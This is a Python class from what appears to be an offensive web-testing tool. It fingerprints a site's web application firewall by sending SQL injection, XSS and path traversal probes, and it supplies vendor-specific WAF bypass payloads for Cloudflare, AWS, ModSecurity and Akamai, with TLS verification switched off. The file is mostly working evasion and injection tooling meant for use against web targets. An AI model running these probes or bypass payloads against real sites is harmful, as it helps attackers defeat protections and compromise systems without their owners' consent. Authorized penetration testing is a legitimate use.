class WAFDetector:
    """Fingerprint WAF vendor from HTTP responses."""

    def detect(self, url: str) -> Dict[str, Any]:
        """Send test payloads and fingerprint WAF from response."""
        result: Dict[str, Any] = {"url": url, "waf_detected": False, "waf_name": "", "confidence": 0.0}

        try:
            requests.get(url, timeout=10, verify=False)
        except Exception as exc:
            return {**result, "error": str(exc)}

        waf_resp = self._trigger_waf(url)
        if not waf_resp:
            result["note"] = "No WAF block response detected"
            return result

        name, score = self._match_signature(waf_resp)
        if score > 20:
            result.update({"waf_detected": True, "waf_name": name,
                           "confidence": round(score, 1), "block_status": waf_resp.status_code})
        return result

    def _trigger_waf(self, url: str):
        """Send malicious payloads to trigger WAF block response."""
        for suffix in ["?id=1'+OR+'1'='1", "?q=<script>alert(1)</script>", "?file=../../../etc/passwd"]:
            try:
                resp = requests.get(url + suffix, timeout=10, verify=False)
                if resp.status_code in (403, 406, 429, 503):
                    return resp
            except Exception:
                pass
        return None

    def _match_signature(self, resp) -> tuple:
        """Match response against WAF signature database."""
        headers_str = " ".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
        body = resp.text[:5000].lower() if resp.text else ""
        code = resp.status_code
        best_name, best_score = "", 0.0

        for sig in WAF_SIGNATURES:
            score = sum(40 for h in sig["headers"] if h.lower() in headers_str)
            score += sum(35 for b in sig["body"] if b.lower() in body)
            if code in sig["codes"]:
                score += 15
            max_possible = len(sig["headers"]) * 40 + len(sig["body"]) * 35 + 15
            normalized = min(score / max_possible * 100, 100) if max_possible else 0
            if normalized > best_score:
                best_score = normalized
                best_name = sig["name"]
        return best_name, best_score

    @staticmethod
    def get_bypass_payloads(waf_name: str, vuln_type: str = "xss") -> List[str]:
        """Get WAF-specific bypass payloads."""
        from hellcat.modules.payload import PayloadGenerator
        waf_payloads = PayloadGenerator.get_waf_bypass(vuln_type)
        if not waf_payloads:
            waf_payloads = PayloadGenerator.get_payloads(vuln_type, "advanced")

        # WAF-specific additions
        waf_lower = waf_name.lower()
        extras = []
        if "cloudflare" in waf_lower:
            extras = ["<svg onload=alert`1`>", "<img/src=x onerror=alert(1)//"]
        elif "aws" in waf_lower:
            extras = ["<details open ontoggle=alert(1)>", "' /*!50000union*/ select 1--"]
        elif "modsecurity" in waf_lower:
            extras = ["<svg/onload='alert`1`'>", "'%20or%201=1%20--%20-"]
        elif "akamai" in waf_lower:
            extras = ["\"><svg/onload=confirm`1`>", "'+or+'1'%3d'1"]

        return list(dict.fromkeys(extras + waf_payloads))[:20]

    @staticmethod
    def list_supported_wafs() -> List[str]:
        return [s["name"] for s in WAF_SIGNATURES]
